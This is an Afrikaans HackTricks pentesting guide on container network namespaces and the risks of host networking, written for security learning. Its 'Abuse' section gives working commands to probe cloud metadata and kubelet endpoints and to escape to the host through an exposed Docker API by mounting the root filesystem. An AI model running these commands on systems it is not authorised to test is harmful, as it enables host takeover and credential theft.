# Netwerk-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die network namespace isoleer netwerkverwante hulpbronne soos koppelvlakke, IP-adresse, routing tables, ARP/neighbor state, firewall rules, sockets, en die inhoud van lêers soos `/proc/net`. Dit is hoekom 'n container skynbaar sy eie `eth0`, sy eie plaaslike roetes, en sy eie loopback-toestel kan hê sonder om die host se werklike netwerkstapel te besit.

Vanuit sekuriteitsoogpunt maak dit saak omdat netwerkisolasie veel meer behels as net poortbinding. 'n Privaat network namespace beperk wat die werkbelasting direk kan observeer of herkonfigureer. Sodra daardie namespace met die host gedeel word, kan die container skielik sigbaarheid kry in host listeners, host-local services, en netwerkkontrolepunte wat nooit bedoel was om aan die toepassing blootgestel te word nie.

## Werking

'n Vars geskepte network namespace begin met 'n leë of byna leë netwerkomgewing totdat koppelvlakke aangeheg word. Container runtimes skep of koppel dan virtuele koppelvlakke, ken adresse toe en konfigureer roetes sodat die werkbelasting die verwagte konnektiwiteit het. In bridge-gebaseerde deployments beteken dit gewoonlik dat die container 'n veth-backed koppelvlak sien wat aan 'n host bridge gekoppel is. In Kubernetes hanteer CNI-plugins die ekwivalente opstelling vir Pod networking.

Hierdie argitektuur verklaar waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide privaat netwerkstapel te ontvang, voeg die werkbelasting by die host se werklike netwerkstapel aan.

## Lab

Jy kan 'n byna leë network namespace sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die host-networked container het nie meer sy eie geïsoleerde socket- en interface-uitsig nie. Daardie verandering alleen is reeds betekenisvol voordat jy selfs vra watter capabilities die proses het.

## Runtime Usage

Docker en Podman skep gewoonlik 'n private network namespace vir elke container, tensy anders gekonfigureer. Kubernetes gee gewoonlik elke Pod sy eie network namespace, gedeel deur die containers binne daardie Pod maar apart van die host. Incus/LXC-stelsels bied ook ryk network-namespace-gebaseerde isolasie, dikwels met 'n wyer verskeidenheid virtuele networking-opstellings.

Die algemene beginsel is dat private networking die standaard isolasiegrens is, terwyl host networking 'n duidelike opt-out van daardie grens is.

## Misconfigurations

Die belangrikste misconfigurasie is eenvoudig om die host network namespace te deel. Dit word soms gedoen vir prestasie, laagvlaksmonitering, of gerief, maar dit verwyder een van die skoonste grense wat aan containers beskikbaar is. Host-local listeners word op 'n meer direkte manier bereikbaar, localhost-only services kan toeganklik raak, en capabilities soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die operasies wat hulle toelaat nou op die host se eie netwerk-omgewing toegepas word.

Nog 'n probleem is om te veel network-related capabilities toe te ken, selfs wanneer die network namespace privaat is. 'n Private namespace help wel, maar dit maak nie raw sockets of gevorderde netwerkbeheer onskadelik nie.

In Kubernetes verander `hostNetwork: true` ook hoeveel vertroue jy in Pod-vlak network-segmentasie kan plaas. Kubernetes dokumenteer dat baie network plugins nie behoorlik `hostNetwork` Pod-verkeer vir `podSelector` / `namespaceSelector` matching kan onderskei nie en dit dus as gewone node-verkeer behandel. Vanuit 'n aanvaller se oogpunt beteken dit dat 'n gekompromitteerde `hostNetwork` workload dikwels as 'n node-vlak network foothold beskou moet word, eerder as 'n gewone Pod wat steeds deur dieselfde beleidsaanname beperk word as overlay-network workloads.

## Abuse

In swak geïsoleerde opstellings kan aanvallers host listening services inspekteer, management endpoints bereik wat slegs aan loopback gebind is, verkeer sniff of daaraan inmeng afhangend van die presiese capabilities en omgewing, of routing en firewall-toestand herkonfigureer as `CAP_NET_ADMIN` teenwoordig is. In 'n cluster kan dit ook laterale beweging en control-plane verkenning vergemaklik.

As jy vermoed dat host networking gebruik word, begin deur te bevestig dat die sigbare interfaces en listeners aan die host behoort in plaas van aan 'n geïsoleerde container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only dienste is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
As netwerkvermoëns teenwoordig is, toets of die workload die sigbare stack kan ondersoek of wysig:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Op moderne kerne kan host networking saam met `CAP_NET_ADMIN` ook die pakketpad blootstel wat verder strek as eenvoudige `iptables` / `nftables`-veranderings. `tc` qdiscs en filters is ook per naamruimte, dus in 'n gedeelde host network namespace geld dit ook vir die host interfaces wat die container kan sien. As `CAP_BPF` ook teenwoordig is, word netwerkverwante eBPF-programme soos TC en XDP loaders ook relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dit maak saak omdat ’n aanvaller moontlik verkeer op die host-interfacevlak kan spiegel, herlei, vorm gee of laat val, en nie net firewall-reëls kan herskryf nie. In ’n private network namespace is daardie aksies tot die container-uitsig beperk; in ’n shared host namespace word hulle host-impacting.

In cluster- of cloud-omgewings regverdig host networking ook vinnige plaaslike recon van metadata en control-plane-aanliggende dienste:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Volledige voorbeeld: Host Networking + Local Runtime / Kubelet toegang

Host networking gee nie outomaties host root nie, maar dit maak dikwels dienste sigbaar wat opsetlik slegs vanaf die node self bereikbaar is. As een van daardie dienste swak beskerm is, word host networking 'n direkte privilege-escalation-pad.

Docker API op localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte host-kompromittering indien 'n plaaslike runtime API blootgestel is sonder behoorlike beskerming
- cluster reconnaissance of lateral movement indien kubelet of plaaslike agents bereikbaar is
- traffic manipulation of denial of service wanneer dit gekombineer word met `CAP_NET_ADMIN`

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die proses 'n private netwerkstapel het, watter roetes en listeners sigbaar is, en of die netwerkuitsig reeds host-agtig lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Wat hier interessant is:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, die container kan die host network namespace of 'n ander nie-private namespace deel.
- `lsns -t net` en `ip netns identify` is nuttig wanneer die shell reeds binne 'n benoemde of volhoubare namespace is en jy dit vanaf die host-kant met `/run/netns`-objekte wil korreleer.
- `ss -lntup` is veral waardevol omdat dit loopback-only listeners en local management endpoints openbaar.
- Routes, interface names, firewall context, `tc` state en eBPF attachments word baie belangriker as `CAP_NET_ADMIN`, `CAP_NET_RAW` of `CAP_BPF` teenwoordig is.
- In Kubernetes kan mislukte service-name resolution vanaf 'n `hostNetwork` Pod eenvoudig beteken dat die Pod nie `dnsPolicy: ClusterFirstWithHostNet` gebruik nie, en nie dat die diens afwesig is nie.

Wanneer jy 'n container hersien, evalueer altyd die network namespace saam met die capability set. Host networking plus sterk netwerk-capabilities is 'n heel ander houding as bridge networking tesame met 'n noue standaard capability set.

## Verwysings

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
